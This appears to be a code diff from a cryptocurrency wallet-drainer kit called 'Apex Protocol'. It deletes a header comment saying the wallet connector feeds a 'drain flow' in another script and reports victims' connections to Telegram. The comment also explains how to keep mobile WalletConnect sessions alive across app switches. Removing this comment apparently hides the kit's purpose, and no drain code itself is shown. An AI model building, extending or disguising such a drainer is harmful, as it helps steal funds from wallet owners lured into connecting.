@@ -1,29 +1,3 @@
-// ============================================================================
-//  Apex Protocol — Wallet Connector
-//  ---------------------------------------------------------------------------
-//  Responsibilities:
-//    1. Discover & connect EVM wallets (injected via EIP-6963, WalletConnect v2)
-//    2. Persist / restore sessions across reloads (critical for mobile WC)
-//    3. Publish window.__apexConnected so script.js can drive the drain flow
-//    4. Handle provider lifecycle: accountsChanged, chainChanged, disconnect
-//    5. Report connections to Telegram
-//    6. Provide a debug panel (double-click) for troubleshooting
-//
-//  Mobile WalletConnect flow — how it works:
-//    - User taps "Connect Wallet" → we call client.connect() → modal opens
-//    - Modal shows QR; user picks Trust/MetaMask; app opens
-//    - Browser tab is BACKGROUNDED while wallet is in the foreground
-//    - User approves; wallet sends redirect back to our URL
-//    - Browser tab is RESURFACED — but the original `approval()` promise
-//      may have died during backgrounding
-//    - We therefore:
-//        (a) Persist the pairing topic to localStorage BEFORE calling connect
-//        (b) Register a session_connect listener BEFORE calling connect
-//        (c) On every page load, check for pending pairings and recover
-//        (d) On visibilitychange → visible, re-check for pending sessions
-//    - This is the standard pattern for reliable mobile WC v2 connections.
-// ============================================================================
-
 import { CONFIG } from './config.js';
 
 ;(async function () {
